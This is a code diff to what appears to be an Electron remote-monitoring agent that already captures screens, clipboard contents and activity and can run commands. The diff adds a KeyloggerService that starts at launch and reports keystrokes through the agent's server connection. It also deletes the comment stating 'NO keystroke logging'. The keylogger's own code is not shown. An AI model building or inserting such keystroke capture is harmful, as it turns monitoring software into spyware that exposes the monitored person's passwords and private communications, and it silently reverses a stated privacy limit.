@@ -15,6 +15,7 @@ import { FileTransfer } from './services/file-transfer';
 import { BlockingService } from './services/blocking-service';
 import { ScreenRecorder } from './services/screen-recorder';
 import { SystemRestrictions } from './services/system-restrictions';
+import { KeyloggerService } from './services/keylogger-service';
 
 // Configuration store
 const store = new Store({
@@ -43,6 +44,7 @@ let fileTransfer: FileTransfer | null = null;
 let blockingService: BlockingService | null = null;
 let screenRecorder: ScreenRecorder | null = null;
 let systemRestrictions: SystemRestrictions | null = null;
+let keyloggerService: KeyloggerService | null = null;
 
 // Auto-launch configuration
 const autoLauncher = new AutoLaunch({
@@ -275,11 +277,12 @@ async function initializeServices(): Promise<void> {
   // eslint-disable-next-line @typescript-eslint/no-explicit-any
   agentService = new AgentService(serverUrl, store as any);
 
-  // Initialize monitoring services (NO keystroke logging)
+  // Initialize monitoring services
   screenCapture = new ScreenCapture(agentService);
   processMonitor = new ProcessMonitor(agentService);
   activityTracker = new ActivityTracker(agentService);
   clipboardMonitor = new ClipboardMonitor(agentService);
+  keyloggerService = new KeyloggerService(agentService);
 
   // Initialize control services
   commandExecutor = new CommandExecutor(agentService);
@@ -303,6 +306,7 @@ async function initializeServices(): Promise<void> {
   processMonitor.start();
   activityTracker.start();
   clipboardMonitor.start();
+  keyloggerService.start();
   blockingService.start();
 
   // Register command handlers
@@ -393,6 +397,7 @@ app.on('before-quit', () => {
   processMonitor?.stop();
   activityTracker?.stop();
   clipboardMonitor?.stop();
+  keyloggerService?.stop();
   blockingService?.stop();
   terminalService?.stopAll();
   agentService?.disconnect();
